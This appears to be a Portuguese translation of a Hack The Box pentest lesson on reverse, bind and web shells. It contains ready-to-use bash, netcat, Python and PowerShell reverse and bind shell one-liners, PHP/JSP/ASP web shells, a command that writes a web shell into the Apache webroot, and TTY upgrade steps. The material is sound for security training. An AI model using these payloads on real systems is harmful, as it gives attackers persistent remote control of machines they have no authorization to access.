Uma vez que comprometemos um sistema e exploramos uma vulnerabilidade para executar comandos nos hosts comprometidos remotamente, geralmente precisamos de um método de comunicação com o sistema para não ter que continuar explorando a mesma vulnerabilidade para executar cada comando. Para enumerar o sistema ou obter mais controle sobre ele ou dentro de sua rede, precisamos de uma conexão confiável que nos dê acesso direto ao shell do sistema, ou seja, `Bash` ou `PowerShell`, para que possamos investigar minuciosamente o sistema remoto para nosso próximo passo.

Uma maneira de se conectar a um sistema comprometido é por meio de protocolos de rede, como `SSH` para Linux ou `WinRM` Windows, o que nos permitiria um login remoto no sistema comprometido. No entanto, a menos que obtenhamos um conjunto funcional de credenciais de login, não poderemos utilizar esses métodos sem executar comandos no sistema remoto primeiro, para obter acesso a esses serviços em primeiro lugar.

O outro método de acessar um host comprometido para controle e execução remota de código é por meio de shells.

Conforme discutido anteriormente, existem três tipos principais de shells: Reverse Shell, Bind Shell e Web Shell. Cada um desses shells tem um método diferente de comunicação conosco para aceitar e executar nossos comandos.

|Tipo de Shell|Método de comunicação|
|---|---|
|`Reverse Shell`|Conecta-se de volta ao nosso sistema e nos dá controle por meio de uma conexão reversa.|
|`Bind Shell`|Espera que nos conectemos a ele e nos dá o controle assim que o fizermos.|
|`Web Shell`|Comunica-se por meio de um servidor da Web, aceita nossos comandos por meio de parâmetros HTTP, executa-os e imprime de volta a saída.|

## Reverse Shell

A `Reverse Shell` é o tipo mais comum de shell, pois é o método mais rápido e fácil de obter controle sobre um host comprometido. Depois de identificar uma vulnerabilidade no host remoto que permite a execução remota de código, podemos iniciar um `netcat` ouvinte em nossa máquina que escuta em uma porta específica, por exemplo, porta `1234`. Com esse ouvinte instalado, podemos executar um `reverse shell command` que conecta o shell dos sistemas remotos, ou seja, `Bash` ou `PowerShell` ao nosso `netcat` ouvinte, o que nos dá uma conexão reversa no sistema remoto.

```shell-session
casluxd@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

As bandeiras que estamos usando são as seguintes:

|Bandeira|Descrição|
|---|---|
|`-l`|Modo de escuta, para aguardar uma conexão para se conectar a nós.|
|`-v`|Modo detalhado, para sabermos quando recebemos uma conexão.|
|`-n`|Desative a resolução de DNS e conecte-se apenas de/para IPs, para acelerar a conexão.|
|`-p 1234`|O número da porta `netcat`está escutando e a conexão reversa deve ser enviada para.|


Agora que temos um `netcat` ouvinte aguardando uma conexão, podemos executar o comando shell reverso que se conecta a nós.

#### Conectar IP de volta

No entanto, primeiro precisamos encontrar o IP do nosso sistema para enviar uma conexão reversa de volta para nós. Podemos encontrar nosso IP com o seguinte comando:

```shell-session
casluxd@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

Em nosso exemplo, o IP que nos interessa está em `tun0`, que é a mesma rede HTB à qual nos conectamos por meio de nossa VPN.

Nota: Estamos nos conectando ao IP em 'tun0' porque só podemos nos conectar às caixas HackTheBox através da conexão VPN, pois elas não possuem conexão com a Internet e, portanto, não podem se conectar a nós pela Internet usando `eth0`. Em um pentest real, você pode estar conectado diretamente na mesma rede, ou realizando um teste de penetração externo, então você pode se conectar através do adaptador `eth0` ou similar.

#### Comando Shell Reverso

O comando que executamos depende do sistema operacional em que o host comprometido é executado, ou seja, Linux ou Windows, e quais aplicativos e comandos podemos acessar. A página [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) tem uma lista abrangente de comandos de shell reverso que podemos usar que cobrem uma ampla gama de opções, dependendo do nosso host comprometido.

Certos comandos de shell reverso são mais confiáveis ​​do que outros e geralmente podem ser tentados para obter uma conexão reversa. Os comandos abaixo são comandos confiáveis ​​que podemos usar para obter uma conexão reversa, em `bash` hosts comprometidos do Linux e `Powershell` em hosts comprometidos do Windows:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Podemos utilizar o exploit que temos sobre o host remoto para executar um dos comandos acima, ou seja, através de um exploit Python ou um módulo Metasploit, para obter uma conexão reversa. Assim que o fizermos, devemos receber uma conexão em nosso `netcat` ouvinte:

```shell-session
casluxd@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, após recebermos uma conexão em nosso `netcat` ouvinte, conseguimos digitar nosso comando e obter sua saída diretamente em nossa máquina.

A `Reverse Shell` é útil quando queremos obter uma conexão rápida e confiável com nosso host comprometido. No entanto, um `Reverse Shell` pode ser muito frágil. Assim que o comando shell reverso for interrompido, ou se perdermos nossa conexão por qualquer motivo, teremos que usar a exploração inicial para executar o comando shell reverso novamente para recuperar nosso acesso.

## Bind Shell

Outro tipo de shell é um arquivo `Bind Shell`. Ao contrário de um `Reverse Shell`que se conecta a nós, teremos que nos conectar a ele na porta de escuta do `target`.
Assim que executarmos um `Bind Shell Command`, ele começará a escutar em uma porta no host remoto e vinculará o shell desse host, ou seja, `Bash` ou `PowerShell`, a essa porta. Temos que nos conectar a essa porta com `netcat`, e obteremos o controle por meio de um shell nesse sistema.

#### Comando Bind Shell

Mais uma vez, podemos utilizar [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) para encontrar um comando adequado para iniciar nosso shell de ligação.

Observação: iniciaremos uma conexão de escuta na porta '1234' no host remoto, com IP '0.0.0.0' para que possamos nos conectar a ela de qualquer lugar.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Assim que executarmos o comando bind shell, devemos ter um shell esperando por nós na porta especificada. Agora podemos nos conectar a ele.

```shell-session
casluxd@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, somos colocados diretamente em uma sessão bash e podemos interagir diretamente com o sistema de destino. Ao contrário de um `Reverse Shell`, se interrompermos nossa conexão com um shell de ligação por qualquer motivo, podemos nos conectar de volta a ele e obter outra conexão imediatamente. No entanto, se o comando shell de ligação for interrompido por qualquer motivo ou se o host remoto for reinicializado, ainda perderemos nosso acesso ao host remoto e teremos que explorá-lo novamente para obter acesso.

#### Atualizando TTY

Uma vez conectado a um shell através do Netcat, notamos que só podemos digitar comandos ou retroceder, mas não podemos mover o cursor de texto para a esquerda ou direita para editar nossos comandos, nem podemos subir e descer para acessar o histórico de comandos. Para poder fazer isso, precisaremos atualizar nosso TTY. Isso pode ser obtido mapeando nosso terminal TTY com o TTY remoto.

Existem vários métodos para fazer isso. Para nossos propósitos, usaremos o método `python/stty`. Em nosso `netcat` shell, usaremos o seguinte comando para usar python para atualizar o tipo de nosso shell para um TTY completo:

```shell-session
casluxd@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Depois de executarmos este comando, iremos usar `ctrl+z` para o segundo plano do nosso shell e voltaremos ao nosso terminal local e inseriremos o seguinte `stty`comando:

```shell-session
www-data@remotehost$ ^Z

casluxd@htb[/htb]$ stty raw -echo
casluxd@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Assim que atingirmos `fg`, ele trará nosso `netcat` shell de volta ao primeiro plano. Neste ponto, o terminal mostrará uma linha em branco. Podemos pressionar `enter`novamente para voltar ao nosso shell ou entrada `reset` e pressionar enter para trazê-lo de volta. Nesse ponto, teríamos um shell TTY totalmente funcional com histórico de comandos e tudo mais.

Podemos notar que nosso shell não cobre todo o terminal. Para corrigir isso, precisamos descobrir algumas variáveis. Podemos abrir outra janela de terminal em nosso sistema, maximizar as janelas ou usar qualquer tamanho que desejarmos e, em seguida, inserir os seguintes comandos para obter nossas variáveis:

```shell-session
casluxd@htb[/htb]$ echo $TERM

xterm-256color
```

```shell-session
casluxd@htb[/htb]$ stty size

67 318
```

O primeiro comando nos mostrou a variável `TERM` e o segundo nos mostra os valores para `rows` e `columns`, respectivamente. Agora que temos nossas variáveis, podemos voltar ao nosso shell `netcat` e usar o seguinte comando para corrigi-las:

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

## Shell Web

O tipo final de shell que temos é um arquivo `Web Shell`. A `Web Shell` é tipicamente um script da web, ou seja, `PHP` ou `ASPX`, que aceita nosso comando por meio de parâmetros de solicitação HTTP, como `GET` ou `POST` parâmetros de solicitação, executa nosso comando e imprime sua saída de volta na página da web.

#### Escrevendo um Web Shell

Em primeiro lugar, precisamos escrever nosso shell da web que receberia nosso comando por meio de uma solicitação `GET`, executá-lo e imprimir sua saída de volta. Um script de shell da web é tipicamente um one-liner que é muito curto e pode ser facilmente memorizado. A seguir estão alguns scripts de shell da web curtos comuns para linguagens da web comuns:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

#### Carregar um Web Shell

Assim que tivermos nosso shell da web, precisamos colocar nosso script de shell da web no diretório da web do host remoto (webroot) para executar o script por meio do navegador da web. Isso pode ocorrer por meio de uma vulnerabilidade em um recurso de upload, que nos permitiria gravar um de nossos shells em um arquivo, ou seja, carregá-lo `shell.php` e, em seguida, acessar nosso arquivo carregado para executar comandos.

No entanto, se tivermos apenas a execução remota de comandos por meio de um exploit, podemos gravar nosso shell diretamente no webroot para acessá-lo pela web. Então, o primeiro passo é identificar onde está o webroot. A seguir estão as raízes da web padrão para servidores da web comuns:

|Servidor web|Webroot padrão|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

Podemos verificar esses diretórios para ver qual webroot está em uso e, em seguida, usar `echo` para escrever nosso shell da web. Por exemplo, se estamos atacando um host Linux rodando Apache, podemos escrever um shell`PHP` com o seguinte comando:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Acessando Web Shell

Depois de escrever nosso shell da web, podemos acessá-lo por meio de um navegador ou usando `cURL`. Podemos visitar a página `shell.php` no site comprometido e usar `?cmd=id` para executar o comando `id`:

![[Pasted image 20230614172307.png]]

```shell-session
casluxd@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, podemos continuar alterando o comando para obter sua saída. Um grande benefício de um shell da web é que ele ignoraria qualquer restrição de firewall em vigor, pois não abrirá uma nova conexão em uma porta, mas executará na porta da web em ou qualquer porta que o aplicativo da web esteja `80` usando `443`. Outro grande benefício é que, se o host comprometido for reinicializado, o shell da web ainda estará no lugar e podemos acessá-lo e obter a execução do comando sem explorar o host remoto novamente.

Por outro lado, um shell da web não é tão interativo quanto os shells reverse e bind, pois temos que continuar solicitando uma URL diferente para executar nossos comandos. Ainda assim, em casos extremos, é possível codificar um script `Python` para automatizar esse processo e nos fornecer um shell web semi-interativo diretamente em nosso terminal.
